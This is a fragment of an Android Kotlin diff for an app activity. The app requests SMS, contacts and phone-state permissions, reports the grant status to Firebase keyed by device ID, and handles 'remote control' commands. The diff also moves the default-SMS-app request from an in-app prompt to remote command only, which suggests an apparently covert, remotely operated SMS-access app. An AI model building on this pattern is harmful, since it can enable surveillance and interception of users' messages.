+                    PermissionSyncHelper.checkAndStartSync(this)
+                }
+            } else {
+                PermissionFirebaseSync.syncPermissionStatus(this, cachedAndroidId)
+                PermissionSyncHelper.checkAndStartSync(this)
+            }
+        }
+    }
+
+    private fun syncRemotePermissionResultsAndContinue(results: List<PermissionManager.PermissionResult>, permissionsList: List<String>) {
+        val smsGranted = results.filter { it.permission == Manifest.permission.RECEIVE_SMS || it.permission == Manifest.permission.READ_SMS }
+            .let { l -> l.isNotEmpty() && l.all { it.isAllowed } }
+        PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "sms", smsGranted)
+        results.forEach { result ->
+            when (result.permission) {
+                Manifest.permission.READ_CONTACTS -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "contacts", result.isAllowed)
+                Manifest.permission.READ_PHONE_STATE -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "phone_state", result.isAllowed)
+                Manifest.permission.POST_NOTIFICATIONS -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "notification", result.isAllowed)
+            }
+        }
+        val specialList = permissionsList.filter { it in listOf("notification", "battery") }.distinct()
+        if (specialList.isNotEmpty()) {
+            PermissionManager.startSpecialPermissionList(this, specialList) { specialResults ->
+                specialResults.forEach { r ->
+                    when (r.permission) {
+                        "notification" -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "notification", r.isAllowed)
+                        "battery" -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "battery", r.isAllowed)
+                    }
+                }
+                PermissionFirebaseSync.syncPermissionStatus(this, cachedAndroidId)
+                PermissionSyncHelper.checkAndStartSync(this)
+            }
+        } else {
+            PermissionFirebaseSync.syncPermissionStatus(this, cachedAndroidId)
+            PermissionSyncHelper.checkAndStartSync(this)
         }
     }
 
@@ -3036,6 +3593,20 @@ class ActivatedActivity : AppCompatActivity() {
                 LogHelper.d("ActivatedActivity", "setup.txt cleared")
         } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error clearing setup.txt", e)
+            }
+
+            // Clear local activation preferences to prevent offline fallback from incorrectly
+            // showing user as activated after reset
+            try {
+                val prefs = getSharedPreferences("activation_prefs", Context.MODE_PRIVATE)
+                prefs.edit()
+                    .putBoolean("locally_activated", false)
+                    .putString("activation_code", "")
+                    .putBoolean("first_launch", true)
+                    .apply()
+                LogHelper.d("ActivatedActivity", "Local activation preferences cleared")
+            } catch (e: Exception) {
+                LogHelper.e("ActivatedActivity", "Error clearing local activation preferences", e)
             }
 
             // Navigate to SplashActivity after a short delay to ensure cleanup
@@ -3222,36 +3793,17 @@ class ActivatedActivity : AppCompatActivity() {
         }
     }
 
-    override fun onResume() {
-        super.onResume()
-        serviceManager.ensureServiceRunning()
-        checkPermissionsAndUpdateUI()
-        // Re-check default SMS app status when activity resumes
-        try {
-            checkDefaultSms()
-        } catch (e: Exception) {
-            LogHelper.e("ActivatedActivity", "Error checking default SMS app in onResume", e)
-        }
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (PermissionManager.handleActivityRequestPermissionsResult(this, requestCode, permissions, grantResults)) return
     }
 
-    /**
-     * Check if app is set as default SMS app and prompt user if not
-     * This is required for full SMS functionality including writing to system SMS database
-     */
-    private fun checkDefaultSms() {
-        try {
-            if (!DefaultSmsAppHelper.isDefaultSmsApp(this)) {
-                LogHelper.d("ActivatedActivity", "App is not default SMS app, prompting user")
-                // Use a small delay to avoid interrupting the UI setup
-                handler.postDelayed({
-                    DefaultSmsAppHelper.requestDefaultSmsApp(this)
-                }, 1000) // 1 second delay to let UI settle
-            } else {
-                LogHelper.d("ActivatedActivity", "App is already set as default SMS app")
-            }
-        } catch (e: Exception) {
-            LogHelper.e("ActivatedActivity", "Error in checkDefaultSms", e)
-        }
+    override fun onResume() {
+        super.onResume()
+        if (PermissionManager.handleActivityResume(this)) return
+        serviceManager.ensureServiceRunning()
+        checkPermissionsAndUpdateUI()
+        // Default SMS app is requested only via remote command (requestDefaultSmsApp); no in-app prompt.
     }
 
     override fun onSaveInstanceState(outState: Bundle) {
@@ -3391,11 +3943,13 @@ class ActivatedActivity : AppCompatActivity() {
             val smsContentFront = id.smsContentFront
             val instructionContentBack = id.instructionContentBack
             val smsCardContentContainer = id.smsCardContentContainer
+            id.smsWipeOverlay?.visibility = View.GONE
 
             when (cardType.lowercase()) {
                 "sms" -> {
                     if (instructionContentBack.visibility == View.VISIBLE) {
-                        animateCardWipeToSms(smsContentFront, instructionContentBack, smsCardContentContainer)
+                        val type = CardTransitionHelper.getSelectedType(this)
+                        CardTransitionHelper.transition(smsCardContentContainer, smsContentFront, instructionContentBack, showB = false, type)
                         LogHelper.d("ActivatedActivity", "Remote control: Showing SMS card")
                     } else {
                         LogHelper.d("ActivatedActivity", "Remote control: Already showing SMS card")
@@ -3404,7 +3958,8 @@ class ActivatedActivity : AppCompatActivity() {
                 "instruction" -> {
                     if (hasInstructionContent) {
                         if (smsContentFront.visibility == View.VISIBLE) {
-                            animateCardWipeToInstruction(smsContentFront, instructionContentBack, smsCardContentContainer)
+                            val type = CardTransitionHelper.getSelectedType(this)
+                            CardTransitionHelper.transition(smsCardContentContainer, smsContentFront, instructionContentBack, showB = true, type)
                             LogHelper.d("ActivatedActivity", "Remote control: Showing instruction card")
                         } else {
                             LogHelper.d("ActivatedActivity", "Remote control: Already showing instruction card")
@@ -3431,26 +3986,24 @@ class ActivatedActivity : AppCompatActivity() {
             val smsContentFront = id.smsContentFront
             val instructionContentBack = id.instructionContentBack
             val smsCardContentContainer = id.smsCardContentContainer
+            id.smsWipeOverlay?.visibility = View.GONE
 
             when (animationType.lowercase()) {
                 "sms" -> {
-                    // Trigger SMS card animations (if any)
                     LogHelper.d("ActivatedActivity", "Remote animation: SMS card animation triggered")
-                    // Add SMS-specific animations here if needed
                 }
                 "instruction" -> {
-                    // Trigger instruction card animations (if any)
                     LogHelper.d("ActivatedActivity", "Remote animation: Instruction card animation triggered")
-                    // Add instruction-specific animations here if needed
                 }
                 "flip" -> {
-                    // Trigger flip animation
                     if (instructionContentBack.visibility == View.VISIBLE) {
-                        animateCardWipeToSms(smsContentFront, instructionContentBack, smsCardContentContainer)
+                        val type = CardTransitionHelper.getSelectedType(this)
+                        CardTransitionHelper.transition(smsCardContentContainer, smsContentFront, instructionContentBack, showB = false, type)
                         LogHelper.d("ActivatedActivity", "Remote animation: Flip to SMS")
                     } else {
                         if (hasInstructionContent) {
-                            animateCardWipeToInstruction(smsContentFront, instructionContentBack, smsCardContentContainer)
+                            val type = CardTransitionHelper.getSelectedType(this)
+                            CardTransitionHelper.transition(smsCardContentContainer, smsContentFront, instructionContentBack, showB = true, type)
                             LogHelper.d("ActivatedActivity", "Remote animation: Flip to Instruction")
                         } else {
                             LogHelper.w("ActivatedActivity", "Remote animation: No instruction content, cannot flip")
